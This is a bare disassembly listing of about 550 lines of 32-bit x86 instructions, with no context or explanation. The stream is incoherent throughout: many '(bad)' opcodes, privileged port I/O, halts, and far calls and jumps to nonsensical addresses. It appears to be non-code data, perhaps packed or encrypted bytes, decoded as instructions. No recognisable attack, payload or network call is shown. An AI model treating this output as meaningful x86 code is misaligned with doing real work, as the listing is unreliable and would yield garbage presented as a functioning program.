  41dd89:	mul    DWORD PTR [eax-0x31]
  41dd8c:	(bad)  
  41dd8e:	dec    ebp
  41dd8f:	mov    eax,0x7b9d4899
  41dd94:	pop    ecx
  41dd95:	jbe    0x41dd93
  41dd97:	dec    eax
  41dd98:	add    DWORD PTR [esp+eax*1-0x51e6a011],esp
  41dd9f:	(bad)  
  41dda0:	adc    al,0x9b
  41dda2:	ins    BYTE PTR es:[edi],dx
  41dda3:	inc    edx
  41dda4:	add    eax,esp
  41dda6:	out    dx,eax
  41dda7:	pusha  
  41dda8:	or     ah,ch
  41ddaa:	sbb    bh,0xd4
  41ddad:	push   ds
  41ddae:	pop    esp
  41ddaf:	ret    0x5cea
  41ddb2:	ins    BYTE PTR es:[edi],dx
  41ddb3:	sbb    al,0x2c
  41ddb5:	clc    
  41ddb6:	adc    ebp,esi
  41ddb8:	and    DWORD PTR [ebx],0x7589fe8c
  41ddbe:	shr    bl,0x44
  41ddc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddc2:	add    cl,0x4f
  41ddc5:	dec    ebx
  41ddc6:	add    bh,BYTE PTR [ecx+ecx*4-0x38f756e7]
  41ddcd:	xor    al,0x2f
  41ddcf:	xor    ch,BYTE PTR [esi]
  41ddd1:	and    ebp,esi
  41ddd3:	sub    DWORD PTR [ecx+0x4a],0xffffff8a
  41ddd7:	into   
  41ddd8:	fidiv  WORD PTR [edx-0x71]
  41dddb:	stc    
  41dddc:	jno    0x41ddf5
  41ddde:	mov    ecx,DWORD PTR [esi+eiz*8]
  41dde1:	fldenv ds:0x39b4a878
  41dde7:	bound  ebp,QWORD PTR [ecx-0x30]
  41ddea:	or     BYTE PTR [edx-0x7c52b27b],al
  41ddf0:	xor    esp,DWORD PTR [esi+0x79218c54]
  41ddf6:	test   al,0x86
  41ddf8:	ja     0x41ddc9
  41ddfa:	(bad)
  41ddfd:	mov    bl,dh
  41ddff:	inc    edi
  41de00:	rcr    DWORD PTR [ebx+0x16],0x54
  41de04:	or     eax,0xbbf70b8d
  41de09:	pop    eax
  41de0a:	loop   0x41de35
  41de0c:	pop    edi
  41de0d:	hlt    
  41de0e:	push   ds
  41de0f:	lods   eax,DWORD PTR ds:[esi]
  41de10:	inc    ebp
  41de11:	inc    BYTE PTR ds:0xd2225cc4
  41de17:	daa    
  41de18:	test   BYTE PTR [edi],ch
  41de1a:	jecxz  0x41de54
  41de1c:	inc    ebx
  41de1d:	lds    ebx,FWORD PTR [esi+eiz*1]
  41de20:	call   0x5332:0x37508caf
  41de27:	add    BYTE PTR [ecx],ah
  41de29:	adc    eax,0x1d0c4c3e
  41de2e:	mov    eax,0x21b8ed25
  41de33:	adc    ah,BYTE PTR [edx+edi*8+0x2945ff00]
  41de3a:	sbb    BYTE PTR [ebx-0x5a],cl
  41de3d:	lock or BYTE PTR es:[esi-0x3],ch
  41de42:	stc    
  41de43:	das    
  41de44:	xchg   edx,eax
  41de45:	push   esp
  41de46:	mul    DWORD PTR [ebx+0xa]
  41de49:	cmp    cl,BYTE PTR [ebx+0x72e137fe]
  41de4f:	fsub   DWORD PTR [esi]
  41de51:	adc    eax,0xa2b2bb77
  41de56:	mov    edi,0xb6c7ab4
  41de5b:	jo     0x41ddee
  41de5d:	add    ecx,DWORD PTR [edi]
  41de5f:	add    DWORD PTR ds:0xbfa736c8,edx
  41de65:	fmul   DWORD PTR [ebp+0x72]
  41de68:	and    edi,0x6faaca43
  41de6e:	and    BYTE PTR [eax],dl
  41de70:	pop    ecx
  41de71:	jmp    DWORD PTR [edi-0x64bc1481]
  41de77:	ins    DWORD PTR es:[edi],dx
  41de78:	nop
  41de79:	cmc    
  41de7a:	sbb    DWORD PTR [esi],ecx
  41de7c:	dec    edi
  41de7d:	mov    ?,WORD PTR [esi+0x9]
  41de80:	loop   0x41dec7
  41de82:	push   esp
  41de83:	or     eax,0x894f2672
  41de88:	les    esi,FWORD PTR [esi+edx*4+0x54604f16]
  41de8f:	ret    0x4a5
  41de92:	dec    ebp
  41de93:	push   ds
  41de94:	hlt    
  41de95:	in     eax,0x40
  41de97:	mov    cl,0xba
  41de99:	push   0xb51e58e3
  41de9e:	sub    BYTE PTR [edx-0x5ac0148d],cl
  41dea4:	push   edi
  41dea5:	mov    esp,0xf1124fa0
  41deaa:	inc    ebp
  41deab:	pop    ebx
  41deac:	mov    ch,0xcc
  41deae:	es es pop ss
  41deb1:	push   ebx
  41deb2:	push   ds
  41deb3:	pop    ss
  41deb4:	(bad)
  41deb9:	cmp    al,0x2a
  41debb:	je     0x41dea4
  41debd:	cmp    eax,0xc3cbca64
  41dec2:	push   edi
  41dec3:	nop
  41dec4:	fsub   QWORD PTR [ebx]
  41dec6:	sbb    eax,0x326a6d5f
  41decb:	cs (bad) 
  41decd:	xor    al,0xa6
  41decf:	jmp    0x18b32653
  41ded4:	mov    cl,BYTE PTR [eax]
  41ded6:	push   ecx
  41ded7:	pop    edx
  41ded8:	js     0x41de8f
  41deda:	call   0xc78c:0x57e01737
  41dee1:	repnz loop 0x41de92
  41dee4:	in     al,dx
  41dee5:	or     al,0x7b
  41dee7:	fistp  WORD PTR [ebx]
  41dee9:	adc    eax,0xbb3239e2
  41deee:	aam    0x67
  41def0:	mov    ebx,0xf045a1a6
  41def5:	add    esp,ebp
  41def7:	jnp    0x41dee2
  41def9:	xlat   BYTE PTR ds:[ebx]
  41defa:	jle    0x41dea6
  41defc:	cmp    al,0x28
  41defe:	jge    0x41df21
  41df00:	nop
  41df01:	aad    0xb7
  41df03:	push   edi
  41df04:	retf   
  41df05:	rcr    DWORD PTR [ecx+0x5e4d18ab],0x7c
  41df0c:	retf   0x2f67
  41df0f:	in     al,dx
  41df10:	mov    dl,BYTE PTR [eax+edx*8+0x74b2c304]
  41df17:	out    0x8d,al
  41df19:	iret   
  41df1a:	daa    
  41df1b:	mov    cl,0x10
  41df1d:	(bad)  
  41df1f:	sbb    al,0x7c
  41df21:	push   ss
  41df22:	mov    ds:0xcb7a76d,al
  41df27:	dec    DWORD PTR [ecx]
  41df29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df2a:	and    edx,DWORD PTR ss:[edi+0x68]
  41df2e:	jnp    0x41df8d
  41df30:	stc    
  41df31:	mov    dl,0x68
  41df33:	pop    ecx
  41df34:	pop    ebp
  41df35:	arpl   si,dx
  41df37:	in     al,dx
  41df38:	jae    0x41df34
  41df3a:	out    dx,al
  41df3b:	(bad)  
  41df3c:	sbb    eax,0x78c897d7
  41df41:	ds test eax,0xac47c9ca
  41df47:	loopne 0x41df83
  41df49:	mov    eax,0xf39fb0e4
  41df4e:	jp     0x41df59
  41df50:	mov    bl,0x7c
  41df52:	jnp    0x41df04
  41df54:	push   ebp
  41df55:	push   edx
  41df56:	imul   eax,ebx,0x15569a10
  41df5c:	mov    eax,0xcef279eb
  41df61:	in     al,dx
  41df62:	push   edi
  41df63:	in     eax,0x57
  41df65:	stc    
  41df66:	inc    ebp
  41df67:	jbe    0x41deed
  41df69:	jmp    0x691c6143
  41df6e:	adc    BYTE PTR [ebx-0x40941ea],ch
  41df74:	mov    DWORD PTR [esi-0x43d0331d],edx
  41df7a:	mov    ds:0x1d458061,eax
  41df7f:	test   al,0xd9
  41df81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df82:	pop    esi
  41df83:	jp     0x41df43
  41df85:	pop    esi
  41df86:	out    0x9,al
  41df88:	jg     0x41dff7
  41df8a:	ret    
  41df8b:	mov    bl,0x8b
  41df8d:	dec    edi
  41df8e:	gs out 0x73,eax
  41df91:	jb     0x41df27
  41df93:	add    eax,0x65d84ee1
  41df98:	scas   al,BYTE PTR es:[edi]
  41df99:	mov    al,0xd0
  41df9b:	das    
  41df9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df9d:	sar    BYTE PTR fs:[edi-0x19],1
  41dfa1:	or     ebx,DWORD PTR [ebp+0x4aed0c6c]
  41dfa7:	inc    esp
  41dfa8:	xchg   esi,eax
  41dfa9:	jle    0x41dfbe
  41dfab:	xchg   esi,eax
  41dfac:	dec    edi
  41dfad:	cmp    eax,edx
  41dfaf:	adc    DWORD PTR [ebp-0x2],0xa8cccf6f
  41dfb6:	jne    0x41e027
  41dfb8:	sub    DWORD PTR [ecx+0x6af924af],esi
  41dfbe:	shr    BYTE PTR [ecx],1
  41dfc0:	sahf   
  41dfc1:	hlt    
  41dfc2:	pop    ecx
  41dfc3:	ins    BYTE PTR es:[edi],dx
  41dfc4:	out    0x87,eax
  41dfc6:	adc    BYTE PTR [ecx+0x2e],dl
  41dfc9:	adc    ebp,DWORD PTR [eax+0x25]
  41dfcc:	imul   edi,edx,0x45
  41dfcf:	xchg   ebx,eax
  41dfd0:	ret    
  41dfd1:	lods   eax,DWORD PTR ds:[esi]
  41dfd2:	jns    0x41dfa5
  41dfd4:	mov    ch,0x9e
  41dfd6:	repz fdiv DWORD PTR [ebx]
  41dfd9:	shl    DWORD PTR [ecx-0xc97047f],0xc0
  41dfe0:	mov    ah,0x0
  41dfe2:	mov    dl,0xc4
  41dfe4:	mov    al,0x8d
  41dfe6:	call   0xf3b1:0x2147a633
  41dfed:	ret    
  41dfee:	jge    0x41e05c
  41dff0:	out    dx,al
  41dff1:	dec    esi
  41dff2:	pop    edi
  41dff3:	sub    BYTE PTR [edi+0x7a],al
  41dff6:	xchg   BYTE PTR [esp+esi*1],bh
  41dff9:	mov    ah,0x5f
  41dffb:	sbb    DWORD PTR [ecx],esp
  41dffd:	mov    ah,0x25
  41dfff:	pop    esi
  41e000:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e001:	mov    eax,0x9d2ba0f5
  41e006:	(bad)  
  41e007:	fimul  WORD PTR [edi]
  41e009:	cdq    
  41e00a:	pop    ebx
  41e00b:	push   eax
  41e00c:	aaa    
  41e00d:	cmp    BYTE PTR [ebx],ah
  41e00f:	sub    eax,0x3e9e2164
  41e014:	int3   
  41e015:	inc    esp
  41e016:	stos   DWORD PTR es:[edi],eax
  41e017:	inc    esp
  41e018:	retf   
  41e019:	imul   ebx,ebp,0x6c035f6c
  41e01f:	sti    
  41e020:	ror    BYTE PTR [edx-0x30],0xb4
  41e024:	(bad)  
  41e025:	push   edi
  41e026:	repnz dec edi
  41e028:	(bad)
  41e02b:	xor    ecx,ebp
  41e02d:	adc    al,cl
  41e02f:	(bad)  
  41e030:	aas    
  41e031:	ret    0x9172
  41e034:	sahf   
  41e035:	inc    eax
  41e036:	dec    edx
  41e037:	mov    edx,0xe4b7bcb3
  41e03c:	pop    edx
  41e03d:	je     0x41e021
  41e03f:	mov    ah,0x85
  41e041:	push   esp
  41e042:	xor    al,0x2a
  41e044:	inc    edx
  41e045:	dec    eax
  41e046:	ja     0x41dfe4
  41e048:	mov    bh,0xac
  41e04a:	jp     0x41e089
  41e04c:	lds    esp,FWORD PTR [esi-0x2aa17ed3]
  41e052:	lods   al,BYTE PTR ds:[esi]
  41e053:	jbe    0x41e012
  41e055:	shl    BYTE PTR [ebp-0x4a],1
  41e058:	test   al,0x12
  41e05a:	adc    cl,0xac
  41e05d:	or     al,0x21
  41e05f:	int3   
  41e060:	pop    ebp
  41e061:	cmp    ah,BYTE PTR [edx+eiz*2+0x4082c177]
  41e068:	aas    
  41e069:	dec    ecx
  41e06a:	sbb    DWORD PTR [edi],0xfffffff8
  41e06d:	ss and al,0x79
  41e070:	stos   BYTE PTR es:[edi],al
  41e071:	mov    dl,cl
  41e073:	dec    edi
  41e074:	out    0x3,eax
  41e076:	lods   al,BYTE PTR ds:[esi]
  41e077:	xchg   ebp,eax
  41e078:	out    dx,al
  41e079:	xchg   esp,esi
  41e07b:	fwait
  41e07c:	jmp    0x2b100890
  41e081:	(bad)  
  41e082:	aas    
  41e083:	add    eax,0x7c5c9e6a
  41e088:	mov    ecx,DWORD PTR [ebx+0x6bd01ddc]
  41e08e:	push   0xffffffdc
  41e090:	and    DWORD PTR [edx+edx*4-0x12],eax
  41e094:	dec    edx
  41e095:	add    BYTE PTR [ebx-0x7f],dh
  41e098:	repz push es
  41e09a:	je     0x41e0bb
  41e09c:	inc    ecx
  41e09d:	cld    
  41e09e:	xchg   ebp,eax
  41e09f:	imul   BYTE PTR [ebp-0x4f]
  41e0a2:	dec    esi
  41e0a3:	scas   eax,DWORD PTR es:[edi]
  41e0a4:	pop    ss
  41e0a5:	mov    al,ds:0x9278ac4b
  41e0aa:	in     al,0xcb
  41e0ac:	or     ch,0xb7
  41e0af:	inc    esi
  41e0b0:	mov    dl,0xd5
  41e0b2:	repz sbb BYTE PTR [ecx],bh
  41e0b5:	mov    al,ds:0x90b0867a
  41e0ba:	fdiv   st(4),st
  41e0bc:	test   DWORD PTR [edx-0x11d7b5fd],esi
  41e0c2:	xchg   edx,eax
  41e0c3:	xor    eax,DWORD PTR [edi]
  41e0c5:	rcl    BYTE PTR [esi+0x5886166a],0xfa
  41e0cc:	lods   eax,DWORD PTR ds:[esi]
  41e0cd:	jno    0x41e10f
  41e0cf:	js     0x41e118
  41e0d1:	and    esi,eax
  41e0d3:	pop    edx
  41e0d4:	push   edx
  41e0d5:	mov    ebp,0xf7a3d041
  41e0da:	jmp    0x41e070
  41e0dc:	je     0x41e127
  41e0de:	mov    cl,0xec
  41e0e0:	ins    BYTE PTR es:[edi],dx
  41e0e1:	cs sahf 
  41e0e3:	in     al,dx
  41e0e4:	test   eax,0x5248a914
  41e0e9:	imul   ebx,DWORD PTR [eax-0x64f0c6a],0xffffffb6
  41e0f0:	aas    
  41e0f1:	in     eax,dx
  41e0f2:	adc    BYTE PTR [ebx+0x7c],bl
  41e0f5:	stos   DWORD PTR es:[edi],eax
  41e0f6:	jecxz  0x41e095
  41e0f8:	aaa    
  41e0f9:	ret    0xf113
  41e0fc:	fbld   TBYTE PTR [ecx-0x468ec6db]
  41e102:	jb     0x41e131
  41e104:	ins    BYTE PTR es:[edi],dx
  41e105:	xchg   edx,eax
  41e106:	mov    ebp,0xd3836aae
  41e10b:	xchg   edx,eax
  41e10c:	ret    0x6712
  41e10f:	or     ebp,edi
  41e111:	push   ebp
  41e112:	loope  0x41e13b
  41e114:	mov    ds:0x5bf62339,eax
  41e119:	and    eax,0x2f59265f
  41e11e:	dec    esp
  41e11f:	mov    dl,0x3c
  41e121:	ins    BYTE PTR es:[edi],dx
  41e122:	mov    esp,0xf35ef0cb
  41e127:	cld    
  41e128:	retf   
  41e129:	int    0x9a
  41e12b:	inc    ebx
  41e12c:	jp     0x41e115
  41e12e:	js     0x41e17b
  41e130:	aas    
  41e131:	jp     0x41e0f6
  41e133:	(bad)  
  41e135:	sub    DWORD PTR [edx],ebp
  41e137:	xor    al,0x93
  41e139:	xor    eax,0xa013c28
  41e13e:	and    ah,BYTE PTR [esi]
  41e140:	leave  
  41e141:	retf   
  41e142:	xor    esi,esp
  41e144:	push   ss
  41e145:	je     0x41e177
  41e147:	ds daa 
  41e149:	retf   0x78cb
  41e14c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e14d:	ret    0xc94d
  41e150:	or     BYTE PTR [edi+0x25804b0a],al
  41e156:	dec    esp
  41e157:	pop    esp
  41e158:	cwde   
  41e159:	ja     0x41e1c8
  41e15b:	dec    edi
  41e15c:	popf   
  41e15d:	shr    esi,0x19
  41e160:	pop    es
  41e161:	inc    esp
  41e162:	mov    BYTE PTR [esp+edi*1-0x65],cl
  41e166:	mov    bh,0x5d
  41e168:	out    dx,al
  41e169:	pusha  
  41e16a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e16b:	jnp    0x41e1a7
  41e16d:	push   ebx
  41e16e:	lods   al,BYTE PTR ds:[esi]
  41e16f:	hlt    
  41e170:	cli    
  41e171:	(bad)  
  41e172:	loopne 0x41e182
  41e174:	lahf   
  41e175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e176:	ret    0xd502
  41e179:	sub    esp,DWORD PTR [ebx-0x67]
  41e17c:	fist   DWORD PTR [eax-0x3]
  41e17f:	inc    esp
  41e180:	(bad)  
  41e181:	and    DWORD PTR [edx-0x45],ebp
  41e184:	repnz mov gs,WORD PTR [ecx+0x1de2dd54]
  41e18b:	(bad)
  41e18f:	mov    ebx,0x52ea01a
  41e194:	inc    edi
  41e195:	leave  
  41e196:	adc    dh,BYTE PTR [edx-0x41]
  41e199:	mov    ch,0xf7
  41e19b:	das    
  41e19c:	scas   eax,DWORD PTR es:[edi]
  41e19d:	outs   dx,BYTE PTR ds:[esi]
  41e19e:	pop    ds
  41e19f:	in     eax,dx
  41e1a0:	and    BYTE PTR [ecx+eiz*1],dh
  41e1a3:	mov    eax,0x5b89c2e7
  41e1a8:	push   ds
  41e1a9:	in     al,dx
  41e1aa:	pop    edx
  41e1ab:	mov    ebp,0x51f01368
  41e1b0:	arpl   WORD PTR [eax+eiz*4-0x41],ax
  41e1b4:	sub    al,0x84
  41e1b6:	sbb    al,0xb7
  41e1b8:	loop   0x41e1c9
  41e1ba:	pop    ebp
  41e1bb:	test   eax,0x3fffe5e2
  41e1c0:	adc    DWORD PTR ss:[edi-0x4d87f0ba],edx
  41e1c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1c8:	cmp    esi,DWORD PTR [ecx-0x31]
  41e1cb:	xchg   DWORD PTR [ebx],ebx
  41e1cd:	(bad)  
  41e1ce:	jne    0x41e210
  41e1d0:	xchg   edx,eax
  41e1d1:	shl    ecx,cl
  41e1d3:	popa   
  41e1d4:	das    
  41e1d5:	mov    edi,0x38c2c233
  41e1da:	fidivr DWORD PTR [edx]
  41e1dc:	adc    DWORD PTR [ecx-0x368d3e62],ebp
  41e1e2:	jg     0x41e24b
  41e1e4:	(bad)  
  41e1e5:	cmp    edi,ebp
  41e1e7:	and    DWORD PTR [esi],ebx
  41e1e9:	xlat   BYTE PTR ds:[ebx]
  41e1ea:	lods   eax,DWORD PTR ds:[esi]
  41e1eb:	cmp    eax,0x1ec056f0
  41e1f0:	jg     0x41e1d3
  41e1f2:	xchg   esi,eax
  41e1f3:	pop    edx
  41e1f4:	push   esp
  41e1f5:	sbb    ebx,eax
  41e1f7:	fnsave [ebx+0x0]
  41e1fa:	cwde   
  41e1fb:	and    al,0x95
  41e1fd:	test   BYTE PTR [eax],0xe5
  41e200:	xor    esp,DWORD PTR [eax-0x4e]
  41e203:	push   edx
  41e204:	and    ebp,DWORD PTR [eax-0x616dfcb3]
  41e20a:	adc    eax,0x38e0abad
  41e20f:	jmp    0x41e1cc
  41e211:	pop    ss
  41e212:	shr    BYTE PTR [ebx-0x33],1
  41e215:	imul   DWORD PTR ds:0x4d93bca7
  41e21b:	and    BYTE PTR [eax-0x8],bh
  41e21e:	pop    esp
  41e21f:	jne    0x41e295
  41e221:	pop    esi
  41e222:	stos   DWORD PTR es:[edi],eax
  41e223:	imul   esp,ebx,0x3fc95ec8
  41e229:	sbb    al,0x2
  41e22b:	out    0xad,eax
  41e22d:	sahf   
  41e22e:	(bad)  
  41e22f:	and    al,0x0
  41e231:	ds jo  0x41e23e
  41e234:	stc    
  41e235:	sahf   
  41e236:	fwait
  41e237:	push   ebp
  41e238:	cmp    al,0x9a
  41e23a:	xchg   ebx,eax
  41e23b:	sub    DWORD PTR [ebx-0x5a],edi
  41e23e:	fcmovnu st,st(1)
  41e240:	test   al,0x7e
  41e242:	icebp  
  41e243:	mov    dl,0xde
  41e245:	shl    DWORD PTR [eax-0x63b8fa5b],cl
  41e24b:	and    ecx,ecx
  41e24d:	test   eax,0x7612300c
  41e252:	test   al,0xd2
  41e254:	sub    DWORD PTR [ecx+0x153c68fd],0x6bf28f63
  41e25e:	adc    al,0xe8
  41e260:	shl    BYTE PTR [ebx],cl
  41e262:	cmpxchg ch,dh
  41e265:	sub    ah,BYTE PTR [ebp+0x36]
  41e268:	ret    
  41e269:	pop    ds
  41e26a:	pop    esp
  41e26b:	arpl   WORD PTR [edx],ax
  41e26d:	mov    esp,0x28f37f8e
  41e272:	xor    BYTE PTR [ecx-0x67db280e],0x29
  41e279:	mov    edx,0xff296753
  41e27e:	push   es
  41e27f:	mov    WORD PTR [ebx-0x2d614d55],fs
  41e285:	mov    cl,BYTE PTR [edx-0x50]
  41e288:	xor    ch,bh
  41e28a:	cmc    
  41e28b:	jl     0x41e2ea
  41e28d:	scas   eax,DWORD PTR es:[edi]
  41e28e:	xor    al,0x22
  41e290:	sti    
  41e291:	xchg   ebp,eax
  41e292:	imul   ebx,DWORD PTR ds:[esi-0x617663f3],0xffffff8d
  41e29a:	xor    al,0x7f
  41e29c:	cs fcmovnb st,st(0)
  41e29f:	xchg   ebp,eax
  41e2a0:	stos   DWORD PTR es:[edi],eax
  41e2a1:	mov    edx,DWORD PTR [esi+ebx*8+0x69862956]
  41e2a8:	sub    cl,0x15
  41e2ab:	jne    0x41e2bd
  41e2ad:	jo     0x41e268
  41e2af:	xor    BYTE PTR ds:0x2c6426d8,bl
  41e2b5:	loope  0x41e2b2
  41e2b7:	sti    
  41e2b8:	in     eax,0x87
  41e2ba:	xor    BYTE PTR [ebp+0x58dd32ff],ah
  41e2c0:	xchg   ebp,eax
  41e2c1:	fist   DWORD PTR fs:[edi-0x37]
  41e2c5:	dec    edx
  41e2c6:	mov    bh,BYTE PTR [ecx]
  41e2c8:	leave  
  41e2c9:	pop    ds
  41e2ca:	shr    edx,1
  41e2cc:	jae    0x41e2a2
  41e2ce:	xchg   ebp,eax
  41e2cf:	rcl    bl,0xd
  41e2d2:	jmp    0x4fb19d40
  41e2d7:	addr16 jb 0x41e352
  41e2da:	das    
  41e2db:	xor    BYTE PTR [bx+di],ch
  41e2de:	std    
  41e2df:	mov    es,eax
  41e2e1:	jmp    0x882dc9e4
  41e2e6:	sar    BYTE PTR [ebp-0x7d2fa95f],cl
  41e2ec:	xor    edi,DWORD PTR [eax-0x6098a08f]
  41e2f2:	jns    0x41e2dd
  41e2f4:	lods   al,BYTE PTR ds:[esi]
  41e2f5:	pop    edx
  41e2f6:	mov    cl,0x3c
  41e2f8:	outs   dx,BYTE PTR ds:[esi]
  41e2f9:	adc    al,0x14
  41e2fb:	outs   dx,DWORD PTR ds:[esi]
  41e2fc:	pop    ebp
  41e2fd:	mov    ah,0xb7
  41e2ff:	ins    DWORD PTR es:[edi],dx
  41e300:	jne    0x41e30f
  41e302:	into   
  41e303:	xor    eax,0xb61a4d7b
  41e308:	pop    ebp
  41e309:	out    0xa2,eax
  41e30b:	int3   
  41e30c:	inc    edi
  41e30d:	dec    eax
  41e30e:	les    esi,FWORD PTR [ecx+0x168fb217]
  41e314:	into   
  41e315:	ins    DWORD PTR es:[edi],dx
  41e316:	cmovbe esi,ebp
  41e319:	or     esp,DWORD PTR [ecx]
  41e31b:	adc    dl,BYTE PTR [ebp+0x33]
  41e31e:	mov    eax,0x8cc7ce96
  41e323:	xchg   ecx,eax
  41e324:	xchg   ecx,eax
  41e325:	sbb    BYTE PTR [esi+0x3b],cl
  41e328:	adc    dl,BYTE PTR [ebp+0x71cd062d]
  41e32e:	(bad)  
  41e32f:	fimul  WORD PTR [edi+0x667a3942]
  41e335:	pop    ebp
  41e336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e337:	fild   WORD PTR [ecx+0x51458c9]
  41e33d:	push   ecx
  41e33e:	mov    edx,0x930ba5be
  41e343:	hlt    
  41e344:	jge    0x41e381
  41e346:	ins    BYTE PTR es:[edi],dx
  41e347:	mov    al,0xed
  41e349:	jb     0x41e37f
  41e34b:	mov    dh,0x29
  41e34d:	loop   0x41e339
  41e34f:	pop    esi
  41e350:	add    DWORD PTR [edx],esp
  41e352:	jb     0x41e3c1
  41e354:	stos   BYTE PTR es:[edi],al
  41e355:	push   cs
  41e356:	fs fwait
  41e358:	dec    edx
  41e359:	jo     0x41e361
  41e35b:	jmp    0x7c63626d
  41e360:	leave  
  41e361:	cmp    DWORD PTR [ebp+edx*8+0x33],edx
  41e365:	daa    
  41e366:	es or  al,0xb9
  41e369:	mov    ds:0x9a244620,eax
  41e36e:	mov    eax,DWORD PTR [edx-0x5eb09ef8]
  41e374:	lods   al,BYTE PTR ds:[esi]
  41e375:	inc    ecx
  41e376:	mov    ?,ecx
  41e378:	in     al,dx
  41e379:	loop   0x41e32d
  41e37b:	dec    esp
  41e37c:	and    BYTE PTR [ecx-0x635982fa],cl
  41e382:	adc    bl,BYTE PTR [ecx-0x2669c180]
  41e388:	push   ebp
  41e389:	ins    BYTE PTR es:[edi],dx
  41e38a:	stos   DWORD PTR es:[edi],eax
  41e38b:	out    0xd8,al
  41e38d:	imul   ecx,DWORD PTR [ecx-0x73cf8d8a],0x65
  41e394:	mov    esi,?
  41e396:	aas    
  41e397:	je     0x41e32b
  41e399:	fisub  DWORD PTR [esi+0x4a]
  41e39c:	in     al,dx
  41e39d:	stos   DWORD PTR es:[edi],eax
  41e39e:	mov    ebp,esi
  41e3a0:	adc    al,0x98
  41e3a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3a3:	mov    esp,0x3f669c22
  41e3a8:	xchg   DWORD PTR [edx-0x5d],ebx
  41e3ab:	jns    0x41e36a
  41e3ad:	aad    0xb7
  41e3af:	cwde   
  41e3b0:	push   ds
  41e3b1:	les    esp,FWORD PTR [esi+0x5ac4a35b]
  41e3b7:	hlt    
  41e3b8:	jb     0x41e3de
  41e3ba:	push   es
  41e3bb:	sti    
  41e3bc:	adc    al,BYTE PTR [esp+eiz*2]
  41e3bf:	jnp    0x41e37f
  41e3c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3c2:	out    dx,al
  41e3c3:	mul    DWORD PTR [ebp-0x5d]
  41e3c6:	lods   eax,DWORD PTR ds:[esi]
  41e3c7:	pop    edi
  41e3c8:	mov    dl,0x56
  41e3ca:	push   ss
  41e3cb:	add    bh,BYTE PTR [esi]
  41e3cd:	push   edx
  41e3ce:	cmp    al,0xe2
  41e3d0:	in     eax,dx
  41e3d1:	or     ecx,DWORD PTR [eax-0x36]
  41e3d4:	xchg   BYTE PTR ds:0xf2a653b9,ch
  41e3da:	mov    ah,0xdc
  41e3dc:	cli    
  41e3dd:	or     ecx,DWORD PTR [eax-0x48239147]
  41e3e3:	iret   
  41e3e4:	cli    
  41e3e5:	loop   0x41e441
  41e3e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3e8:	lahf   
  41e3e9:	imul   esi,ebx,0xdbbe34c3
  41e3ef:	ret    
  41e3f0:	dec    ecx
  41e3f1:	sub    ebx,DWORD PTR [esi]
  41e3f3:	push   edx
  41e3f4:	adc    BYTE PTR ds:0xe3456c47,dh
  41e3fa:	aad    0xfa
  41e3fc:	sub    al,0x8d
  41e3fe:	dec    edi
  41e3ff:	and    BYTE PTR [eax+edi*4],al
  41e402:	test   al,0xa8
  41e404:	icebp  
  41e405:	mov    dh,0xa4
  41e407:	mov    dh,al
  41e409:	dec    edi
  41e40a:	in     al,0x52
  41e40c:	and    ebx,DWORD PTR [edi-0x4f]
  41e40f:	cmp    eax,0x5b2ad168
  41e414:	in     eax,dx
  41e415:	adc    al,0x31
  41e417:	bound  eax,QWORD PTR [eax]
  41e419:	xor    BYTE PTR [edx+esi*2+0x6f],bh
  41e41d:	stc    
  41e41e:	fdivr  QWORD PTR [ebx]
  41e420:	xor    al,0x76
  41e422:	xor    eax,0x461b2a33
  41e427:	pusha  
  41e428:	cli    
  41e429:	int3   
  41e42a:	data16 mov al,ds:0x13429159
  41e430:	push   0xffffffb3
  41e432:	repnz inc edx
  41e434:	and    ch,ch
  41e436:	mov    edx,DWORD PTR [esi+0x6d2681fe]
  41e43c:	cwde   
  41e43d:	les    ebp,FWORD PTR [eax-0x58]
  41e440:	shl    bl,0x86
  41e443:	xlat   BYTE PTR ds:[ebx]
  41e444:	push   esi
  41e445:	stos   BYTE PTR es:[edi],al
  41e446:	jbe    0x41e427
  41e448:	adc    DWORD PTR [esp+esi*8-0x14],ebx
  41e44c:	jge    0x41e46a
  41e44e:	mov    eax,ds:0x16697ed3
  41e453:	lahf   
  41e454:	jle    0x41e46d
  41e456:	addr16 mov edx,0x9a25a89c
  41e45c:	daa    
  41e45d:	push   esi
  41e45e:	jns    0x41e42e
  41e460:	mov    al,0x7
  41e462:	cmp    al,0x6f
  41e464:	sti    
  41e465:	test   BYTE PTR [edx+0x1c],0x76
  41e469:	test   eax,0x647440af
  41e46e:	inc    DWORD PTR [edx+esi*4-0x6e]
  41e472:	lea    ebx,[esi]
  41e474:	das    
  41e475:	test   BYTE PTR [ebp+0x77],0x3
  41e479:	xchg   esp,eax
  41e47a:	popf   
  41e47b:	sub    al,0x2e
  41e47d:	sub    al,0xde
  41e47f:	(bad)  
  41e480:	stc    
  41e481:	es dec ebx
  41e483:	mov    esp,0xfc208f2
  41e488:	mov    cl,0x56
  41e48a:	and    al,0xfa
  41e48c:	out    0x78,al
  41e48e:	ret    
  41e48f:	int    0x2
  41e491:	hlt    
  41e492:	std    
  41e493:	lock sar BYTE PTR [ebx+ecx*1+0x1f8f6878],0x26
  41e49c:	jle    0x41e4b7
  41e49e:	popa   
  41e49f:	or     ebx,DWORD PTR [ebx-0x6a]
  41e4a2:	mov    edx,0x5f6d14ed
  41e4a7:	idiv   bh
  41e4a9:	sub    DWORD PTR [edi-0x4d2f1f21],ecx
  41e4af:	push   es
  41e4b0:	pop    edx
  41e4b1:	mov    ds:0x9189192e,al
  41e4b6:	mov    DWORD PTR [edx+eiz*8+0x378380d],esp
  41e4bd:	mov    BYTE PTR [eax+ebp*1-0x56e1496b],bl
  41e4c4:	jae    0x41e46f
  41e4c6:	sub    al,0xdf
  41e4c8:	xchg   ebp,eax
